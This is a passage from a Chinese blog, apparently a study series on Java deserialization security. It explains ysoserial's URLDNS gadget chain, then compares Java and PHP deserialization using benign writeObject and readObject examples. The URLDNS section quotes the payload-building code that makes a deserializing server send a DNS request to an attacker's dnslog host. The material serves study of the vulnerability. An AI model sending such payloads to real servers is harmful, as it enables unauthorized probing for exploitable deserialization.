class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="URLDNS利用链解析"><a href="#URLDNS利用链解析" class="headerlink" title="URLDNS利用链解析"></a>URLDNS利用链解析</h3><p>可以看到<code>URLDNS</code>这里调用<code>getObject</code>方法读取一个字符串类型的参数<code>url</code>，也就是我们接收服务器<code>DNS</code>请求的<code>url</code>(通常是dnslog上获取的)</p>
<p>最后返回一个<code>HashMap</code>对象<code>ht</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        ht.put(u, url); </span><br><span class="line">        Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而这个HashMap对象也就是我们反序列化的对象，进行查看HashMap类的代码，因为java反序列化的关键是<code>readObject</code>，所以进一步分析HashMap类的<code>readObject</code>方法。</p>
<blockquote>
<p>注，ysoserial是需要较低版本的java环境，高版本的java中HashMap的代码被重写过，我使用的版本是<code>jdk1.8.0_171</code></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Reconstitute the &#123;<span class="doctag">@code</span> HashMap&#125; instance from a stream (i.e.,</span></span><br><span class="line"><span class="comment">  * deserialize it).</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">     <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">     s.defaultReadObject();</span><br><span class="line">     reinitialize();</span><br><span class="line">     <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                          loadFactor);</span><br><span class="line">     s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">     <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">     <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                          mappings);</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">         <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">         <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">         <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">         <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                    DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                    (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                    MAXIMUM_CAPACITY :</span><br><span class="line">                    tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">         <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">         threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                      (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">         <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">         SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">         <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">         Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">         table = tab;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">             <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                 <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">             <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                 <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">             putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用链利用过程"><a href="#利用链利用过程" class="headerlink" title="利用链利用过程"></a>利用链利用过程</h3><p>在ysoserial的URLDNS利用链代码注释中，也说明了利用链的过程</p>
<blockquote>
<ul>
<li>Gadget Chain:</li>
<li>HashMap.readObject()</li>
<li>​    HashMap.putVal()</li>
<li>​        HashMap.hash()</li>
<li>​            URL.hashCode()</li>
</ul>
</blockquote>
<p>原理简析，</p>
<blockquote>
<p>HashMap类对readObject方法进行了重写，在进行反序列化时会调用hash函数计算键的</p>
</blockquote>
<p>所以当触发<code>HashMap.readObect()</code>方法后，接着是到<code>putVal()</code>，也就是代码的45行，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p>进行调试，</p>
]]></content>
      <categories>
        <category>Java漫谈学习</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全[反序列化(1)]</title>
    <url>/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/</url>
    <content><![CDATA[<p>终于开始反序列化开篇，之前再RMI的攻击和流程中发现，大多数的数据发送和接收都是反序列化数据。</p>
<blockquote>
<p>那么，为什么反序列化常常会带来安全隐患？ </p>
<p>一门成熟的语言，如果需要在网络上传递信息，通常会用到一些格式化数据，</p>
<p>比如： </p>
<ul>
<li>JSON </li>
<li>XML</li>
</ul>
<p>但这两个数据格式都有一个共 同的问题：不支持复杂的数据类型。 大多数处理方法中，JSON和XML支持的数据类型就是基本数据类型，整型、浮点型、字符串、布尔 等，如果开发者希望在传输数据的时候直接传输一个对象，那么就不得不想办法扩展基础的 JSON（XML）语法。 </p>
<p>比如，Jackson和Fastjson这类序列化库，在JSON（XML）的基础上进行改造，通过特定的语法来传递对象；亦或者如RMI，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行 传输。</p>
<p>不管是Jackson、Fastjson还是编程语言内置的序列化方法，一旦涉及到序列化与反序列化数据，就可 能会涉及到安全问题。但首先要理解的是，“反序列化漏洞”是对一类漏洞的泛指，而不是专指某种反序 列化方法导致的漏洞，比如Jackson反序列化漏洞和Java readObject造成的反序列化漏洞就是完全不同 的两种漏洞。 </p>
</blockquote>
<p>我们先来说说Java内置的序列化方法<code>readObject</code>，和其有关的漏洞</p>
<span id="more"></span>

<h1 id="Java安全-反序列化-1"><a href="#Java安全-反序列化-1" class="headerlink" title="Java安全[反序列化(1)]"></a>Java安全[反序列化(1)]</h1><h2 id="反序列化方法的对比"><a href="#反序列化方法的对比" class="headerlink" title="反序列化方法的对比"></a>反序列化方法的对比</h2><p>说到反序列化，第一时间想到的就是php反序列化和python反序列化。</p>
<p>其中Java反序列化与php反序列化有类似之处，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，反序列化时再按照序列化的格式顺序，将属性拿回来重新赋值给新的对象。</p>
<p>但是两者区别在于，Java反序列化更加深入，它提供了更加高级、灵活的方法<code>wirteObject</code>，</p>
<blockquote>
<p>允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 <code>readObject</code> 进行读取。</p>
</blockquote>
<p>而php中有个魔术方法叫做<code>__wakeup</code>，在反序列化的时候进行触发。虽然Java的<code>readObject</code>也是在反序列化的时候触发的，但是两者处理的问题还是有所不同的。</p>
<ul>
<li><code>readObject</code>倾向于解决<code>反序列化时，如何将序列化对象进行还原为一个完整的对象</code></li>
<li><code>__wakeup</code>更倾向于解决<code>反序列化后，如何初始化这个对象</code></li>
</ul>
<p>下面仔细分析这两者的差异。</p>
<h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p>php在对数据进行序列化的过程开发者是无法介入的，在调用<code>serialize</code>函数后，序列化数据就已经完成，最后直接得到一个完整的对象，如果还想在序列化数据流中新增某一个内容，只能将其保存在一个属性中，所以php的序列化、反序列化是一个纯内部的过程，而其<code>__sleep</code>、<code>__wakeup</code>魔术方法的目的就是序列化或者反序列化的前后执行一些操作。</p>
<p>一个非常典型的PHP序列化例子，就是含有资源类型的PHP类，如数据库连接： </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dsn = <span class="variable">$dsn</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$this</span>-&gt;dsn, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PHP中，<code>资源类型的对象默认是不会写入序列化数据</code>中的。那么上述<code>Connection</code>类的 <code>$link</code> 属性在序 列化后就是<code>null</code>，反序列化时拿到的也是<code>null</code>。 那么，如果我想要反序列化时拿到的 <code>$link</code> 就是一个数据库连接，我就需要编写 <code>__wakeup</code> 方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Connection</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$link</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dsn</span>, <span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dsn = <span class="variable">$dsn</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$this</span>-&gt;dsn, <span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;dsn&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见，这里 <code>__wakeup</code> 的工作就是在反序列化拿到<code>Connection</code>对象后，执行 <code>connect()</code> 函数，连接数 据库。</p>
<p> <code>__wakeup</code> 的作用在反序列化后，执行一些初始化操作。但其实我们很少利用序列化数据传递资源类型 的对象，而其他类型的对象，在反序列化的时候就已经赋予其值了。 </p>
<p>所以你会发现，PHP的反序列化漏洞，很少是由 <code>__wakeup</code> 这个方法触发的，通常触发在析构函数 <code>__destruct</code> 里。其实大部分PHP反序列化漏洞，都并不是由反序列化导致的，只是通过反序列化可以 控制对象的属性，进而在后续的代码中进行危险操作。</p>
<h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>上篇文章最后提及<code>classAnnotations</code>，这里讲到<code>ObjectAnnotations</code>知识。</p>
<p><code>Java</code>在序列化时一个对象，将会调用这个对象<code>writeobject</code>方法，参数类型是<code>ObjectOutputStream</code>，开发者可以将任何内容写入这个<code>stream</code>中；</p>
<p>反序列化时，会调用<code>readobject</code>，开发者也可以从读取出前面的写入的内容，再进行处理。</p>
<p>举个例子，展示<code>writeobject</code>和<code>readobject</code>的作用，</p>
<p>先写个<code>Person</code>类，重写<code>writeobject</code>和<code>readobject</code>，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Ser_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    Person(String name, <span class="type">int</span> age) &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span></span><br><span class="line">            IOException &#123;</span><br><span class="line">        s.defaultWriteObject();  <span class="comment">//调用默认写对象，把Person类中name和age序列化写入字节流中</span></span><br><span class="line">        s.writeObject(<span class="string">&quot;This is a object&quot;</span>); <span class="comment">//额外写入字符串，加到序列化对象后面，写入字节流中</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();  <span class="comment">//调用默认读对象，反序列化Person类中name和age</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) s.readObject();  <span class="comment">//读取写入字符串</span></span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;per.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(p);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;per.ser&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20231104085645456.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20231104085645456.png" alt="image-20231104085645456"></a></p>
<p>最后用工具<code>SerializationDumper</code>得到反序列化内容，</p>
<blockquote>
<p>java -jar .\SerializationDumper.jar -r .\test\per.ser</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">STREAM_MAGIC - <span class="number">0xac</span> ed</span><br><span class="line">STREAM_VERSION - <span class="number">0x00</span> <span class="number">05</span></span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - <span class="number">0x73</span></span><br><span class="line">    TC_CLASSDESC - <span class="number">0x72</span></span><br><span class="line">      className</span><br><span class="line">        Length - <span class="number">12</span> - <span class="number">0x00</span> 0c</span><br><span class="line">        Value - Ser_1.Person - <span class="number">0x5365725f312e506572736f6e</span></span><br><span class="line">      serialVersionUID - <span class="number">0xb5</span> <span class="number">13</span> 8a f8 <span class="number">13</span> b1 5c a7</span><br><span class="line">      newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">00</span></span><br><span class="line">      classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br><span class="line">      fieldCount - <span class="number">2</span> - <span class="number">0x00</span> <span class="number">02</span></span><br><span class="line">      Fields</span><br><span class="line">        <span class="number">0</span>:</span><br><span class="line">          Int - I - <span class="number">0x49</span></span><br><span class="line">          fieldName</span><br><span class="line">            Length - <span class="number">3</span> - <span class="number">0x00</span> <span class="number">03</span></span><br><span class="line">            Value - age - <span class="number">0x616765</span></span><br><span class="line">        <span class="number">1</span>:</span><br><span class="line">          Object - L - <span class="number">0x4c</span></span><br><span class="line">          fieldName</span><br><span class="line">            Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">            Value - name - <span class="number">0x6e616d65</span></span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - <span class="number">0x74</span></span><br><span class="line">              newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">01</span></span><br><span class="line">              Length - <span class="number">18</span> - <span class="number">0x00</span> <span class="number">12</span></span><br><span class="line">              Value - Ljava/lang/String; - <span class="number">0x4c6a6176612f6c616e672f537472696e673b</span></span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - <span class="number">0x70</span></span><br><span class="line">    newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">02</span></span><br><span class="line">    classdata</span><br><span class="line">      Ser_1.Person</span><br><span class="line">        values</span><br><span class="line">          <span class="title function_">age</span></span><br><span class="line">            <span class="params">(<span class="type">int</span>)</span><span class="number">20</span> - <span class="number">0x00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">14</span></span><br><span class="line">          name</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - <span class="number">0x74</span></span><br><span class="line">                newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">03</span></span><br><span class="line">                Length - <span class="number">4</span> - <span class="number">0x00</span> <span class="number">04</span></span><br><span class="line">                Value - John - <span class="number">0x4a6f686e</span></span><br><span class="line">        objectAnnotation</span><br><span class="line">          TC_STRING - <span class="number">0x74</span></span><br><span class="line">            newHandle <span class="number">0x00</span> 7e <span class="number">00</span> <span class="number">04</span></span><br><span class="line">            Length - <span class="number">16</span> - <span class="number">0x00</span> <span class="number">10</span></span><br><span class="line">            Value - This is a object - <span class="number">0x546869732069732061206f626a656374</span></span><br><span class="line">          TC_ENDBLOCKDATA - <span class="number">0x78</span></span><br></pre></td></tr></table></figure>

<p>可以看到，我们写入的字符串 <code>This is a object</code> 被放在 <code>objectAnnotation</code> 的位置，并且位于<code>Person</code>类的<code>name</code>和<code>age</code>的后面。 在反序列化时，读取了这个字符串，并将其输出。</p>
<blockquote>
<p>这个特性就让<code>Java</code>的开发变得非常灵活。比如后面将会讲到的<code>HashMap</code>，其就是将<code>Map</code>中的所有键、 值都存储在 <code>objectAnnotation</code> 中，而并不是某个具体属性里。</p>
</blockquote>
<h4 id="重写writeObject和readObject"><a href="#重写writeObject和readObject" class="headerlink" title="重写writeObject和readObject"></a>重写<code>writeObject</code>和<code>readObject</code></h4><p>对于Java序列化和反序列化的过程，可以更加详细的分析，</p>
<blockquote>
<p>首先<code>writeObject</code>是对对象进行序列化，而<code>readObject</code>是对对象进行反序列化</p>
<p>序列化数据后无法通过赋值修改，</p>
<p>而序列化之前以及反序列化之后，可以进行赋值修改数据</p>
</blockquote>
<p>就拿上面的代码进行展示，</p>
<h5 id="writeObject"><a href="#writeObject" class="headerlink" title="writeObject"></a>writeObject</h5><p>在调用默认写对象进行序列化前，将<code>age</code>加上<code>100</code>，然后用工具看看反序列后数据，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span></span><br><span class="line">           IOException &#123;</span><br><span class="line">       age = age + <span class="number">100</span>;</span><br><span class="line">       s.defaultWriteObject();</span><br><span class="line">       s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20231104100930112.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20231104100930112.png" alt="image-20231104100930112"></a></p>
<p>但是如果将这个加<code>100</code>写到序列化后进行，就无法实现，无法覆盖序列化数据中age的值，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span></span><br><span class="line">           IOException &#123;</span><br><span class="line">       s.defaultWriteObject();</span><br><span class="line">       age = age + <span class="number">100</span>;</span><br><span class="line">       s.writeObject(<span class="string">&quot;This is a object&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20231104101020500.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20231104101020500.png" alt="image-20231104101020500"></a></p>
<p>在理解学习时，又发现，并不是需要实例化传参，才给writeObject，</p>
<p>可以看到我重新定义一个Example类，然后直接给Person类中的元素赋值，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20240103165433126.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20240103165433126.png" alt="image-20240103165433126"></a></p>
<p>然后执行结果为我们直接定义的值，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20240103165843165.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20240103165843165.png" alt="image-20240103165843165"></a></p>
<p>这是因为<code>Person p = new Person();</code>并非只是实例化构造方法，而是整体类，包括其中的元素和方法。</p>
<p>所以当<code>writeObject</code>方法打印<code>age</code>时，就直接读取我们定义好的<code>age</code>，也就是直接读取<code>public int age = Example.age;</code></p>
<p>而非一定需要构造函数传参。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20240103165815668.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20240103165815668.png" alt="image-20240103165815668"></a></p>
<h5 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h5><p>但是反序列化就有点意思了，如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    age = age + <span class="number">100</span>;</span><br><span class="line">    System.out.println(age);</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    System.out.println(age);</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) s.readObject();</span><br><span class="line">    System.out.println(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20231104103730076.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20231104103730076.png" alt="image-20231104103730076"></a></p>
<p>可以看到，<code>age = age + 100</code>后打印的结果是<code>100</code>，也就是在<code>readObject</code>中<code>age = 0</code>，也可以推出在<code>writeObject</code> 中<code>age=20</code>，从下面的测试代码可以看出来。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20231216211543444.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20231216211543444.png" alt="image-20231216211543444"></a></p>
<p>调试断点看看，可以看到<code>readObject</code>并没有调用<code>Person</code>构造函数中的值，而是读取变量定义时候的值，所以<code>age</code>和<code>name</code>都默认为初始，一个为<code>0</code>，一个为<code>null</code>。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)%5D/image-20240103161643826.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(1)]/image-20240103161643826.png" alt="image-20240103161643826"></a></p>
<p>这也是因为<code>readObject</code>并不需要参数，没有和<code>wirteObject</code>一样读取实例化对象p。</p>
<p>所以<code>readObject</code>就只能获取变量默认值，而<code>wirteObject</code>可以读取变量的定义值。</p>
